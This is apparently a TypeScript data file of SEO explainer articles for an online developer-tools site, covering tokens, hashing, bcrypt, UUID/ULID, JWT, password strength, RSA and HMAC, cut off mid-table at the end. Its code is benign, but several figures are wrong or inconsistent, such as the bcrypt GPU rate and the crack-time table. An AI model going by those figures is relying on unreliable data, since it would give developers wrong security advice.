export interface Article {
  slug: string
  toolPath: string
  title: string
  description: string
  keywords: string[]
  category: string
  publishedAt: string
  content: string
}

export const articles: Article[] = [
  // ─── Crypto ───────────────────────────────────────────────────
  {
    slug: 'what-is-token-generator',
    toolPath: '/token-generator',
    title: 'What Is a Random Token Generator and Why Do You Need One?',
    description: 'Learn how to generate cryptographically secure random tokens for API keys, session IDs, CSRF tokens, and more.',
    keywords: ['token generator', 'random token', 'API key generator', 'secure token', 'csrf token'],
    category: 'Crypto',
    publishedAt: '2025-06-01',
    content: `## What Is a Random Token Generator?

A **random token generator** creates unpredictable, high-entropy strings used as identifiers in modern software systems. Unlike passwords chosen by humans, tokens are machine-generated and designed to satisfy strict security requirements: they must be unique across all instances, sufficiently long to resist guessing, and statistically random so that no partial information about one token reveals anything about another.

Tokens power nearly every aspect of authenticated web communication. When you log into a website, the server mints a session token and stores it in a cookie. When a developer integrates a third-party API, the vendor issues an API key — a token. When a web form protects against cross-site request forgery (CSRF), it embeds a hidden token that the server verifies before processing the submission.

## Why Not Just Use a Password or UUID?

Passwords are designed to be memorized by humans, which means they're short and follow predictable patterns. A token, by contrast, can be 64 or 128 characters of pure randomness. UUIDs (version 4) are random, but only 122 bits of entropy and formatted with hyphens — adequate for identifiers but not ideal for secret tokens exposed in headers or URLs.

A purpose-built token generator lets you control length, character set, and entropy budget precisely.

## Common Token Use Cases

- **API Keys** — Authenticate third-party services without exposing user passwords. Typically 32–64 characters, often prefixed (e.g., \`sk_live_...\`) for easy identification.
- **Session Tokens** — Track authenticated users across HTTP requests. OWASP recommends at least 128 bits (22+ base64url characters).
- **CSRF Tokens** — Embedded in forms to prevent cross-site request forgery. Must be unique per session and verified server-side.
- **Password Reset Links** — One-time-use URLs emailed to users. Should expire within 15–60 minutes.
- **Webhook Secrets** — Sign and verify payloads between services. GitHub, Stripe, and Slack all use HMAC signatures with a shared secret token.
- **Invite Codes** — Short random tokens that grant access to a resource once.
- **Nonces** — "Number used once" values that prevent replay attacks in OAuth and cryptographic protocols.
- **Two-Factor Backup Codes** — Emergency codes stored by users in case they lose their authenticator device.

## How Does This Tool Generate Tokens?

This token generator uses the browser's built-in **Web Crypto API** (\`crypto.getRandomValues()\`) — the same standard used in professional security libraries. The values come from the operating system's entropy pool (hardware events, timing jitter, etc.), making them cryptographically secure.

You can configure:
- **Length** — from 8 to 512 characters
- **Character sets** — uppercase letters (A–Z), lowercase letters (a–z), digits (0–9), and symbols (!@#$%^&*)
- **Output format** — plain text, hex, base64, or base64url

## How Long Should Your Token Be?

| Use Case | Min Length | Recommended Character Set |
|---|---|---|
| CSRF token | 32 chars | alphanumeric |
| API key | 32 chars | alphanumeric + symbols |
| Session ID | 64 chars | hex or base64url |
| Password reset | 64 chars | hex or base64url |
| Webhook secret | 32 chars | alphanumeric |

The formula for entropy: **E = log₂(N^L)** where N is the number of possible characters and L is the length. A 32-character alphanumeric token has log₂(62³²) ≈ 190 bits of entropy — far beyond any brute-force reach.

## Best Practices for Token Security

1. **Never reuse tokens across services.** Each integration should have its own token.
2. **Store tokens hashed.** In your database, store \`sha256(token)\` — never the plain token. This way, a database breach doesn't expose live tokens.
3. **Set expiry times.** Short-lived tokens (minutes for password reset, hours for sessions) reduce the attack window.
4. **Use HTTPS exclusively.** Tokens in URLs or headers are plaintext and must be encrypted in transit.
5. **Rotate tokens after security incidents.** If you suspect a token was compromised, invalidate it immediately.
6. **Prefix tokens for type identification.** Stripe uses \`sk_live_\`, \`sk_test_\`, etc. This makes it easy to identify leaked tokens in logs or code repositories.
7. **Avoid tokens in URLs.** URL parameters end up in server logs, browser history, and referrer headers. Prefer Authorization headers or request bodies.

## Token Generation in Code

\`\`\`javascript
// Node.js — crypto module (built-in)
const crypto = require('crypto');
const token = crypto.randomBytes(32).toString('hex'); // 64 hex chars

// Browser — Web Crypto API
const bytes = new Uint8Array(32);
crypto.getRandomValues(bytes);
const token = Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
\`\`\`

\`\`\`python
# Python
import secrets
token = secrets.token_hex(32)  # 64 hex chars
token_url = secrets.token_urlsafe(32)  # 43 base64url chars
\`\`\`

→ Try the [Token Generator](/token-generator)`,
  },
  {
    slug: 'how-to-hash-text-online',
    toolPath: '/hash-text',
    title: 'How to Hash Text Online: MD5, SHA-1, SHA-256, and More',
    description: 'Understand hashing algorithms and use our free tool to hash any text with MD5, SHA-256, SHA-512, and more.',
    keywords: ['hash text', 'SHA-256 online', 'MD5 hash', 'SHA-512', 'hash calculator'],
    category: 'Crypto',
    publishedAt: '2025-06-02',
    content: `## What Is Hashing?

Hashing is a mathematical process that converts any input — a word, a file, a database record — into a fixed-length output called a **digest** or **hash**. The transformation is deterministic (same input always yields same output) but practically irreversible (you cannot reconstruct the input from the hash).

This one-way property distinguishes hashing from encryption. Encryption is reversible with the right key; hashing is not. This makes hashes ideal for verifying data integrity and storing credentials without exposing the originals.

## How Hash Functions Work

A good cryptographic hash function satisfies three properties:

1. **Deterministic** — The same input always produces the same hash.
2. **Avalanche Effect** — A tiny change in input (even one bit) completely changes the hash.
3. **Collision Resistant** — It should be computationally infeasible to find two different inputs with the same hash.

Example of the avalanche effect with SHA-256:

\`\`\`
Input: "hello"
SHA-256: 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824

Input: "hellp"
SHA-256: ac3478d69a3c81fa62e60f5c3696165a4e5e6ac4b51d12bed36a0f21b3c3e1a8
\`\`\`

Despite differing by only one character, the hashes are completely different.

## Popular Hashing Algorithms Compared

| Algorithm | Output Size | Speed | Security Status |
|---|---|---|---|
| MD5 | 128 bits (32 hex) | Very fast | **Broken** — do not use for security |
| SHA-1 | 160 bits (40 hex) | Fast | **Deprecated** — collision attacks exist |
| SHA-256 | 256 bits (64 hex) | Fast | ✅ Widely used, recommended |
| SHA-512 | 512 bits (128 hex) | Moderate | ✅ Strong, good for file integrity |
| SHA-3 | Variable | Moderate | ✅ Modern standard, NIST approved |
| BLAKE2 | Variable | Very fast | ✅ Faster than SHA-256, highly secure |

MD5 and SHA-1 are no longer considered cryptographically secure for sensitive operations — researchers have demonstrated practical collision attacks. However, they're still used for non-security checksums (file deduplication, cache keys) where collision resistance isn't critical.

## Practical Uses of Hashing

### 1. File Integrity Verification
When you download software, the provider often publishes a SHA-256 checksum. After downloading, you compute the hash locally and compare. If they match, the file hasn't been tampered with in transit.

### 2. Password Storage
Modern systems never store passwords in plain text. Instead, they store a hash (ideally with bcrypt, Argon2, or scrypt rather than plain SHA). When a user logs in, the entered password is hashed and compared against the stored hash.

### 3. Digital Signatures
To sign a document digitally, you hash the document and then encrypt the hash with your private key. Recipients can decrypt the signature with your public key and verify it matches their locally computed hash.

### 4. Deduplication and Cache Keys
Content-addressable storage systems (like Git) identify objects by their hash. Two files with identical content have the same hash and are stored only once.

### 5. Data Structures
Hash tables use hashing to map keys to array indices, enabling O(1) average-case lookups.

## Hashing vs. Encryption vs. Encoding

| | Hashing | Encryption | Encoding |
|---|---|---|---|
| Reversible | ❌ | ✅ (with key) | ✅ (always) |
| Requires key | ❌ | ✅ | ❌ |
| Use for security | Integrity/passwords | Confidentiality | Data format |
| Example | SHA-256 | AES-256 | Base64 |

A common mistake is using Base64 "encoding" to hide sensitive data. Base64 is trivially reversible and provides zero security. Always use proper hashing or encryption for sensitive information.

## SHA-256 vs SHA-512: Which to Choose?

**SHA-256** is the safer general-purpose choice — widely supported, well-audited, and fast on 32-bit and 64-bit systems alike. **SHA-512** produces a longer hash and is marginally faster on 64-bit systems (it operates on 64-bit words). For most purposes, SHA-256 is sufficient.

## How to Hash Text in This Tool

1. Enter your text in the input field.
2. Select your desired algorithm (MD5, SHA-1, SHA-256, SHA-384, SHA-512, SHA-3).
3. The hash is computed in real time in your browser using the Web Crypto API.
4. Copy the output and use it in your application.

Nothing is sent to any server — all computation happens locally.

→ Try the [Hash Text Tool](/hash-text)`,
  },
  {
    slug: 'bcrypt-password-hashing-guide',
    toolPath: '/bcrypt',
    title: 'Bcrypt Password Hashing: The Complete Developer Guide',
    description: 'Learn why bcrypt is the gold standard for password storage, how cost factors work, and how to verify passwords safely.',
    keywords: ['bcrypt', 'password hashing', 'bcrypt online', 'password storage', 'salt rounds'],
    category: 'Crypto',
    publishedAt: '2025-06-03',
    content: `## What Is bcrypt?

**bcrypt** is a password hashing function designed by Niels Provos and David Mazieres, presented at USENIX 1999. It remains one of the most widely recommended algorithms for hashing passwords in user authentication systems. Unlike general-purpose hash functions like MD5 or SHA-256 (which are designed to be fast), bcrypt is deliberately slow and computationally expensive — a critical property for password security.

## Why bcrypt for Passwords?

### The Problem with Fast Hash Functions
General cryptographic hash functions like SHA-256 are optimized for speed. Modern hardware can compute billions of SHA-256 hashes per second. This makes brute-force attacks against hashed passwords feasible:
- A GPU can check ~10 billion MD5 hashes/second
- If a database of SHA-256 hashed passwords is leaked, attackers can test billions of guesses per second

### bcrypt's Adaptive Cost Factor
bcrypt includes a **work factor** (also called cost factor) that controls how computationally expensive the hash computation is. Each increment doubles the work:
- Work factor 10: ~100ms per hash
- Work factor 12: ~400ms per hash
- Work factor 14: ~1.6 seconds per hash

An attacker cracking work-factor-12 bcrypt hashes can only test ~2.5 hashes per second on a GPU (compared to billions for MD5). This makes brute-force attacks computationally infeasible for strong passwords.

As hardware gets faster, you can increase the work factor to maintain security. This adaptive property is bcrypt's key advantage.

## bcrypt Hash Format

A bcrypt hash looks like:
\`\`\`
$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/AwB5RoP8YTp7vFyAu
\`\`\`

Breaking it down:
- \`$2b$\` — bcrypt algorithm version (2b is the current recommended version)
- \`12\` — work factor (cost factor)
- \`LQv3c1yqBWVHxkd0LHAkCO\` — 22-character Base64-encoded salt (128 bits)
- \`Yz6TtxMQJqhN8/AwB5RoP8YTp7vFyAu\` — 31-character Base64-encoded hash

The salt and hash are stored together in the single output string — you don't need a separate column for the salt.

## The bcrypt Salting Process

A **salt** is random data added to the password before hashing. bcrypt generates a unique random salt for each password:

\`\`\`
User sets password: "mysecretpassword"
Random salt:        "LQv3c1yqBWVHxkd0LHAkCO"
Hash input:         salt + password
bcrypt output:      $2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/AwB5RoP8YTp7vFyAu
\`\`\`

Benefits of salting:
- **Prevents rainbow tables**: Pre-computed hash tables are useless because each hash has a unique salt
- **Identical passwords have different hashes**: Two users with "password123" get completely different bcrypt hashes
- **No need to store salt separately**: The salt is embedded in the hash output

## Choosing the Work Factor

OWASP recommends a work factor that takes at least 1 second on your server hardware. As hardware improves, increase the work factor accordingly.

Guidelines:
- **Interactive login** (web app): 10-12 (100ms-400ms)
- **API authentication**: 10-11 (acceptable latency)
- **Offline storage**: 14+ (maximum security)

Test your server and choose the highest work factor that keeps authentication under your latency budget.

## bcrypt in Popular Languages

### Node.js (bcryptjs or bcrypt)
\`\`\`javascript
const bcrypt = require('bcryptjs');

// Hash a password
const saltRounds = 12;
const hash = await bcrypt.hash('myPassword', saltRounds);

// Verify a password
const isValid = await bcrypt.compare('myPassword', hash);
\`\`\`

### Python (bcrypt library)
\`\`\`python
import bcrypt

# Hash
password_hash = bcrypt.hashpw(b'myPassword', bcrypt.gensalt(rounds=12))

# Verify
is_valid = bcrypt.checkpw(b'myPassword', password_hash)
\`\`\`

### PHP (built-in password_hash)
\`\`\`php
// Hash
$hash = password_hash('myPassword', PASSWORD_BCRYPT, ['cost' => 12]);

// Verify
$valid = password_verify('myPassword', $hash);
\`\`\`

## bcrypt Limitations

### 72-Character Password Limit
bcrypt truncates input at 72 bytes. Passwords longer than 72 characters are treated identically regardless of the additional characters. Solutions: pre-hash with SHA-256 or use Argon2id instead.

### Not Suitable for Non-Password Data
bcrypt is designed for passwords (human-memorable, moderate length). For encrypting arbitrary data, use AES. For API key verification, bcrypt is overkill — HMAC-SHA256 is more appropriate.

## Alternatives: Argon2, scrypt

More modern alternatives:
- **Argon2id**: Winner of the Password Hashing Competition (2015). Better memory-hardness. Recommended for new systems.
- **scrypt**: Similar memory-hard design, used in some cryptocurrency systems.

bcrypt remains excellent for most applications due to its long track record and wide library support.

## Using the bcrypt Tool

Our tool:
1. **Hash a password** — enter any password and choose the work factor
2. **Verify a hash** — test if a password matches an existing bcrypt hash
3. **Configure cost factor** — set work factor from 4 (testing) to 14 (maximum)
4. **View timing** — see how long the hash takes at the selected cost factor
5. **Copy result** — one-click copy of the generated hash

Use it for testing bcrypt implementations, generating hashes for development databases, and understanding how work factors affect performance.
`,
  },
  {
    slug: 'uuid-vs-ulid-which-to-use',
    toolPath: '/uuid-generator',
    title: 'UUID vs ULID: Which Unique ID Should You Use?',
    description: 'Compare UUID and ULID formats for database primary keys. Learn when to use each and generate them instantly.',
    keywords: ['UUID generator', 'UUID v4', 'ULID vs UUID', 'unique ID', 'database primary key'],
    category: 'Crypto',
    publishedAt: '2025-06-04',
    content: `## What Is a Unique Identifier?

Unique identifiers (UIDs) are strings or numbers that uniquely identify records in a database, distributed system, or communication protocol. The two most common formats in modern software are **UUID** (Universally Unique Identifier) and **ULID** (Universally Unique Lexicographically Sortable Identifier).

Choosing the wrong format can lead to poor database performance, difficult debugging, or compatibility issues. This guide explains both formats and helps you decide which to use.

## UUID: The Universal Standard

UUID is defined in RFC 4122 and consists of 128 bits displayed as 32 hexadecimal characters split by hyphens:

\`\`\`
550e8400-e29b-41d4-a716-446655440000
\`\`\`

**UUID version 4** (the most common) uses random bits for all fields. It has approximately 122 bits of randomness — about 5.3 × 10³⁶ possible values. The probability of collision when generating 1 billion UUIDs is about 1 in 10²⁰.

| UUID Version | Source | Use Case |
|---|---|---|
| v1 | MAC address + timestamp | Legacy, exposes device MAC |
| v3 | MD5 hash of namespace + name | Deterministic from name |
| v4 | Random | General purpose ✅ |
| v5 | SHA-1 hash of namespace + name | Deterministic from name |
| v7 | Unix timestamp + random | Sortable, modern ✅ |

## ULID: Sortable by Design

ULID encodes a 48-bit millisecond timestamp followed by 80 bits of randomness, displayed as 26 Crockford Base32 characters:

\`\`\`
01ARZ3NDEKTSV4RRFFQ69G5FAV
│──────────│──────────────│
  10 chars     16 chars
  (timestamp)  (random)
\`\`\`

Because the timestamp is the prefix, ULIDs sort lexicographically in chronological order. Records created at the same millisecond share a timestamp prefix but differ in the random suffix, preserving uniqueness.

## Head-to-Head Comparison

| Feature | UUID v4 | UUID v7 | ULID |
|---|---|---|---|
| Length (string) | 36 chars | 36 chars | 26 chars |
| Sortable | ❌ | ✅ | ✅ |
| URL-safe | Needs encoding | Needs encoding | ✅ |
| Contains timestamp | ❌ | ✅ | ✅ |
| Standardized | RFC 4122 | RFC 9562 (2024) | Community spec |
| Database index performance | Fragmented | Good | Good |
| Readability | Low | Low | Moderate |

## Database Performance: Why Sortability Matters

In B-tree indexes (PostgreSQL, MySQL), sequential inserts are far more efficient than random inserts. UUID v4's randomness causes **index fragmentation**: each new row is inserted at a random position in the index tree, causing frequent page splits and cache misses.

ULIDs and UUID v7 solve this by using monotonically increasing values (most of the time), which allows new records to be appended near the end of the index, dramatically reducing write overhead in high-throughput systems.

Benchmark data from various PostgreSQL experiments shows 3–5× better insert performance with sortable IDs on large tables (100M+ rows).

## When to Use UUID v4

- **Maximum compatibility** — Every database, language, and framework understands UUID.
- **No timestamp leakage** — If you don't want creation time embedded in IDs.
- **Simple integration** — Available in SQL (\`gen_random_uuid()\` in PostgreSQL 13+), Node.js (\`crypto.randomUUID()\`), Python (\`uuid.uuid4()\`).
- **Low-to-medium throughput** — Fine for most applications with under millions of daily records.

## When to Use ULID

- **High-write databases** — Event sourcing, logs, audit trails.
- **URL-safe IDs** — No hyphens or special characters.
- **Debugging** — You can extract creation time from the ULID itself.
- **Sorted lists** — Use as a cursor for pagination without storing \`created_at\` separately.

## When to Use UUID v7

UUID v7 (formalized in RFC 9562, April 2024) offers the best of both worlds: standard UUID format with embedded Unix timestamp for sortability. It's increasingly supported in databases (PostgreSQL 17+) and libraries. For new projects, UUID v7 is often the best choice.

## Practical Code Examples

\`\`\`javascript
// UUID v4 — Node.js built-in
const { randomUUID } = require('crypto');
const id = randomUUID(); // "550e8400-e29b-41d4-a716-446655440000"

// ULID — npm package
import { ulid } from 'ulid';
const id = ulid(); // "01ARZ3NDEKTSV4RRFFQ69G5FAV"
\`\`\`

\`\`\`sql
-- PostgreSQL UUID v4
SELECT gen_random_uuid();

-- PostgreSQL UUID v7 (pg 17+ or pgcrypto extension)
SELECT uuid_generate_v7();
\`\`\`

→ Try [UUID Generator](/uuid-generator) or [ULID Generator](/ulid-generator)`,
  },
  {
    slug: 'jwt-parser-explained',
    toolPath: '/jwt-parser',
    title: 'JWT Explained: How to Read and Validate JSON Web Tokens',
    description: 'Decode and inspect any JWT token. Learn about header, payload, signature, expiry, and common security mistakes.',
    keywords: ['JWT parser', 'decode JWT', 'JSON web token', 'JWT security', 'JWT expiry'],
    category: 'Crypto',
    publishedAt: '2025-06-05',
    content: `## What Is a JWT?

A **JSON Web Token (JWT)** is a compact, self-contained way to transmit information between parties as a signed JSON object. The information can be verified and trusted because it is digitally signed. JWTs can be signed using a secret key (HMAC) or a public/private key pair (RSA, ECDSA).

JWTs are widely used for authentication (knowing who the user is) and authorization (knowing what the user can do) in modern web applications and APIs.

## The Three-Part Structure

A JWT consists of three Base64URL-encoded parts separated by dots:

\`\`\`
xxxxx.yyyyy.zzzzz
header.payload.signature
\`\`\`

### Part 1: Header

\`\`\`json
{
  "alg": "HS256",
  "typ": "JWT"
}
\`\`\`

The header declares the token type and the signing algorithm. Common algorithms:
- **HS256** — HMAC with SHA-256 (symmetric — same secret for signing and verification)
- **RS256** — RSA with SHA-256 (asymmetric — private key signs, public key verifies)
- **ES256** — ECDSA with P-256 (asymmetric — smaller keys than RSA)

### Part 2: Payload (Claims)

\`\`\`json
{
  "sub": "user_12345",
  "email": "user@example.com",
  "role": "admin",
  "iat": 1716000000,
  "exp": 1716086400
}
\`\`\`

Claims are statements about an entity (user) and additional metadata.

**Registered Claims (RFC 7519):**

| Claim | Name | Description |
|---|---|---|
| \`iss\` | Issuer | Who issued the token (e.g., "https://auth.example.com") |
| \`sub\` | Subject | Token subject, usually user ID |
| \`aud\` | Audience | Who the token is intended for |
| \`exp\` | Expiration | Unix timestamp when token expires |
| \`iat\` | Issued At | Unix timestamp when token was issued |
| \`jti\` | JWT ID | Unique token identifier (for revocation) |

**Custom Claims:** You can add any claims you need (\`role\`, \`email\`, \`plan\`, etc.). Keep payload small — it's included in every request.

### Part 3: Signature

\`\`\`
HMACSHA256(
  base64url(header) + "." + base64url(payload),
  secret_key
)
\`\`\`

The signature ensures the token hasn't been tampered with. For HMAC-signed tokens, only parties with the secret can create valid signatures. For RSA-signed tokens, anyone with the public key can verify signatures, but only the private key holder can create them.

## How JWT Authentication Works

1. User logs in with credentials.
2. Server validates credentials, creates a JWT with user claims, signs it with secret key.
3. Server returns the JWT to the client.
4. Client stores the JWT (typically in memory or localStorage) and includes it in the \`Authorization\` header of subsequent requests: \`Authorization: Bearer <token>\`.
5. Server receives request, verifies JWT signature, checks \`exp\`, reads claims.
6. Server processes the request based on the claims.

No session state is required on the server — the JWT itself carries all necessary information.

## Security Pitfalls and How to Avoid Them

### 1. Algorithm Confusion Attack
Some JWT libraries accept "alg: none" (no signature), allowing attackers to forge tokens. **Always specify and validate the expected algorithm server-side.**

### 2. Trusting the Payload Without Verification
The payload is Base64-encoded — not encrypted. Anyone can decode it. **Never trust payload data without verifying the signature first.**

### 3. Weak Secrets
HMAC secrets that are too short or predictable can be cracked. Use at least 256 bits of random data for HS256 secrets.

### 4. Not Checking Expiry
Always validate the \`exp\` claim. A valid signature on an expired token should still be rejected.

### 5. Storing Sensitive Data in Payload
Since the payload is not encrypted, never store passwords, credit card numbers, or other secrets in JWT claims.

### 6. No Token Revocation
JWTs are stateless — once issued, they're valid until \`exp\`. To revoke tokens before expiry, maintain a blocklist (by \`jti\`) or use short-lived tokens (15 minutes) with refresh tokens.

## JWT vs Session Tokens

| | JWT | Server Sessions |
|---|---|---|
| Storage | Client | Server (DB/Redis) |
| Scalability | Excellent (stateless) | Requires shared state |
| Revocation | Hard | Easy |
| Payload visibility | Public (Base64) | Private |
| Best for | APIs, microservices | Monolithic web apps |

## Reading a JWT with This Tool

Paste any JWT into the parser to instantly see:
- Decoded header and payload formatted as JSON
- Expiry status (expired / valid / time remaining)
- Signing algorithm
- All claims with human-readable timestamps

All processing happens in your browser — your token is never sent to any server.

→ Try the [JWT Parser](/jwt-parser)`,
  },
  {
    slug: 'password-strength-guide',
    toolPath: '/password-strength-analyser',
    title: 'How Strong Is Your Password? A Complete Guide to Password Security',
    description: 'Analyze your password strength instantly. Learn what makes a password secure and how attackers crack weak ones.',
    keywords: ['password strength', 'password checker', 'strong password', 'password security', 'crack time'],
    category: 'Crypto',
    publishedAt: '2025-06-06',
    content: `## What Makes a Password "Strong"?

Password strength is measured by **entropy** — the amount of unpredictability in a password. The more entropy, the longer it takes to crack. Entropy depends on two factors: the size of the character pool used (uppercase, lowercase, digits, symbols) and the length of the password.

Formula: **Entropy = L × log₂(N)**

Where L = password length and N = number of possible characters.

| Character Set | Pool Size | 12-char entropy |
|---|---|---|
| Digits only | 10 | 39.9 bits |
| Lowercase only | 26 | 56.4 bits |
| Alpha + digits | 62 | 71.5 bits |
| Full ASCII printable | 95 | 78.9 bits |

A 12-character password using the full ASCII set has ~79 bits of entropy — adequate for most purposes, assuming the hashing is done properly.

## Real-World Crack Times

Crack time depends on the hashing algorithm used to store the password and the attacker's hardware. Using bcrypt (cost 12) on a single GPU:

| Password | Entropy | Crack Time |
|---|---|---|
| \`password\` | Very low | Instant (dictionary) |
| \`P@ssw0rd\` | ~28 bits | Seconds |
| \`abc12345\` | ~38 bits | Minutes |
| \`mK7#vQ2p\` | ~52 bits | Years |
| \`Correct-Horse-Battery\` | ~51 bits | Centuries |
| \`X7#kLm$9pQr@2vN\` | ~97 bits | Billions of years |

These numbers assume offline cracking (the attacker has the hash database). Online attacks (guessing through a login form) are throttled by rate limiting — even weak passwords survive online attacks if the service implements account lockout.

## Common Attack Methods

### Dictionary Attacks
Attackers try known passwords from massive wordlists (RockYou, Have I Been Pwned) and their common mutations: \`password123\`, \`P@ssword\`, \`passw0rd\`. These cover the majority of real-world weak passwords.

### Brute Force
Try every possible combination. Practical only for short passwords — 8 characters or fewer with limited character sets.

### Credential Stuffing
Use username/password pairs leaked from other breaches. If you reuse passwords across sites, a breach at any one site compromises all your accounts.

### Rainbow Tables
Precomputed tables of hashes for common passwords. Defeated by salting (modern hashing libraries always salt).

### Password Spraying
Try a small set of common passwords across many accounts to avoid lockout thresholds.

## What This Tool Measures

This password strength analyzer evaluates:

- **Entropy calculation** — Based on character pool × length.
- **Pattern detection** — Keyboard walks (\`qwerty\`, \`12345\`), dates (\`19901231\`), repeated characters (\`aaabbb\`).
- **Dictionary check** — Tests against common password patterns and substitutions.
- **Estimated crack time** — Given different attack scenarios (online throttled, offline fast hash, offline bcrypt).
- **Compliance feedback** — Whether the password meets common requirements (8+ chars, uppercase, number, symbol).

## Best Practices for Strong Passwords

### Use a Password Manager
Applications like Bitwarden (open source), 1Password, or KeePass generate and store truly random passwords — you never have to remember them. This allows you to use a unique, long, random password for every account.

### Passphrases Are Underrated
Four random words ("correct horse battery staple") may be easier to remember than "X7#kLm$9" while actually providing more entropy. The key word is **random** — "sunshine puppy rainbow" doesn't count.

### Enable Two-Factor Authentication
Even a weak password is much safer with 2FA enabled. An attacker who somehow obtains your password still can't log in without your second factor.

### Never Reuse Passwords
Password reuse is the #1 reason breaches cascade. Use a unique password for every account — a password manager makes this trivially easy.

### Check If Your Password Has Been Breached
The [Have I Been Pwned](https://haveibeenpwned.com) service maintains a database of billions of leaked credentials. If your password appears in a breach, change it immediately.

## Corporate Password Policies: NIST Guidelines

The National Institute of Standards and Technology (NIST SP 800-63B) updated its password guidance in 2017 with evidence-based recommendations:

- **Minimum 8 characters** (prefer longer)
- **No mandatory complexity rules** (they don't improve security and frustrate users)
- **No mandatory periodic rotation** (unless there's evidence of compromise)
- **Check passwords against breach databases**
- **Allow pasting passwords** (it helps users use password managers)

Many organizations still enforce outdated policies (expire every 90 days, must include symbol, can't reuse last 12) that NIST now discourages.

→ Try the [Password Strength Analyser](/password-strength-analyser)`,
  },
  {
    slug: 'rsa-key-pair-explained',
    toolPath: '/rsa-key-pair-generator',
    title: 'RSA Key Pairs: How They Work and How to Generate Them',
    description: 'Understand RSA public/private key cryptography. Learn key sizes, use cases, and generate key pairs in your browser.',
    keywords: ['RSA key pair', 'RSA generator', 'public private key', 'asymmetric encryption', 'SSH key'],
    category: 'Crypto',
    publishedAt: '2025-06-07',
    content: `## What Is RSA?

RSA (named after Rivest, Shamir, and Adleman, who published the algorithm in 1977) is the world's most widely used **asymmetric encryption** algorithm. Unlike symmetric encryption (one key for both encryption and decryption), RSA uses a mathematically linked **key pair**: a public key and a private key.

The fundamental property: what one key encrypts, only the other key can decrypt. This asymmetry enables secure communication between parties who have never met and shared a secret.

## The Mathematics Behind RSA (Simplified)

RSA security is based on the **integer factorization problem**: multiplying two large prime numbers is computationally trivial, but factoring the result back into its prime factors is practically impossible for large enough numbers.

1. Choose two large random primes: p = 61, q = 53 (in practice, 1024+ digit numbers)
2. Compute n = p × q = 3233 (the modulus, shared publicly)
3. Compute φ(n) = (p-1)(q-1) = 3120 (Euler's totient)
4. Choose e such that gcd(e, φ(n)) = 1 — public exponent (commonly 65537)
5. Compute d = e⁻¹ mod φ(n) — private exponent
6. **Public key:** (e, n) = (17, 3233)
7. **Private key:** (d, n) = (2753, 3233)

The private key's d value requires knowing p and q, which cannot be efficiently recovered from n.

## Key Operations

### Encryption
Encrypt message M with public key: C = M^e mod n
Decrypt ciphertext C with private key: M = C^d mod n

### Digital Signatures
Sign data D with private key: S = D^d mod n (or hash(D)^d mod n)
Verify signature S with public key: D = S^e mod n

This means anyone can verify a signature using the public key, but only the private key holder could have created it.

## Key Sizes and Security

| Key Size | Security Level | Use Case |
|---|---|---|
| 512 bit | Broken | Do not use |
| 1024 bit | Weak | Legacy only |
| 2048 bit | ~112-bit security | ✅ Minimum recommended |
| 3072 bit | ~128-bit security | Good for 2030+ |
| 4096 bit | ~140-bit security | High-security systems |

NIST recommends 2048-bit RSA as the minimum through 2030, then 3072+ bit thereafter. The overhead of 4096-bit keys is significant — handshake latency increases measurably for web servers under load.

## Common RSA Applications

### SSH Authentication
Replace password-based login with key-based authentication:

\`\`\`bash
# Generate RSA key pair
ssh-keygen -t rsa -b 4096 -C "your_email@example.com"

# Copy public key to server
ssh-copy-id user@server.com

# Connect without password
ssh user@server.com
\`\`\`

The public key is stored in \`~/.ssh/authorized_keys\` on the server. The private key never leaves your machine.

### HTTPS / TLS
Every HTTPS connection uses asymmetric cryptography (RSA or ECDSA) during the handshake to establish a shared symmetric session key. The website's RSA key pair is embedded in its TLS certificate.

### Code Signing
Software publishers sign releases with their private key. Users can verify the signature with the public key to confirm the software hasn't been modified.

### JWT (RS256 Algorithm)
JSON Web Tokens can be signed with an RSA private key (RS256). API consumers can verify signatures using the public key, enabling stateless authentication without sharing a secret.

## RSA vs ECDSA: The Modern Alternative

Elliptic Curve Cryptography (ECDSA/ECDH) provides equivalent security to RSA with much smaller key sizes:

| Algorithm | Key Size | Security Level |
|---|---|---|
| RSA | 3072 bit | 128-bit |
| ECDSA | 256 bit | 128-bit |

A 256-bit ECDSA key is as secure as a 3072-bit RSA key. For new systems, ECDSA (or Ed25519) is generally preferred due to smaller key sizes, faster computation, and smaller signature sizes.

## Public Key Infrastructure (PKI)

RSA keys are typically distributed via certificates following the X.509 standard. A Certificate Authority (CA) signs a certificate binding a public key to an identity (domain name, email address, or person). Browsers and operating systems maintain a list of trusted CAs.

## Generating RSA Keys with This Tool

This browser-based tool generates RSA key pairs locally — no keys are transmitted to any server. You can:
- Choose key size (1024, 2048, or 4096 bits)
- Generate a new key pair instantly
- Copy the public and private keys in PEM format for use in your applications

**Security note:** For production use, always generate private keys on secure, trusted hardware. Browser-generated keys are suitable for learning and testing.

→ Try the [RSA Key Pair Generator](/rsa-key-pair-generator)`,
  },
  {
    slug: 'hmac-generator-guide',
    toolPath: '/hmac-generator',
    title: 'HMAC Explained: Message Authentication with a Secret Key',
    description: 'Learn what HMAC is, how it differs from regular hashing, and when to use it for API authentication and data integrity.',
    keywords: ['HMAC generator', 'HMAC SHA256', 'message authentication', 'API signature', 'HMAC vs hash'],
    category: 'Crypto',
    publishedAt: '2025-06-08',
    content: `## What Is HMAC?

**HMAC** (Hash-based Message Authentication Code) is a specific type of message authentication code involving a cryptographic hash function and a secret cryptographic key. It combines the power of a hash function (data integrity) with a shared secret key (authenticity), providing both in a single compact output.

HMAC was standardized in RFC 2104 and is used everywhere from AWS request signing to webhook verification on GitHub and Stripe.

## Why Not Just Hash the Message?

If you simply hash a message and send both together, an attacker can:
1. Intercept the message and hash.
2. Modify the message.
3. Compute a new hash of the modified message.
4. Replace both — the receiver has no way to detect tampering.

HMAC prevents this because computing a valid MAC requires the secret key. Without the key, an attacker cannot forge a valid MAC for a modified message.

## How HMAC Works

\`\`\`
HMAC(K, m) = H((K' ⊕ opad) || H((K' ⊕ ipad) || m))
\`\`\`

Where:
- H = hash function (SHA-256, SHA-512, etc.)
- K = secret key (padded to block size as K')
- m = message
- opad = outer padding (0x5c repeated)
- ipad = inner padding (0x36 repeated)

The key is processed twice: once mixed into the inner hash, and again into the outer hash. This double-keying structure prevents length-extension attacks that affect plain hashing.

## HMAC vs Plain Hashing

| Property | Plain Hash | HMAC |
|---|---|---|
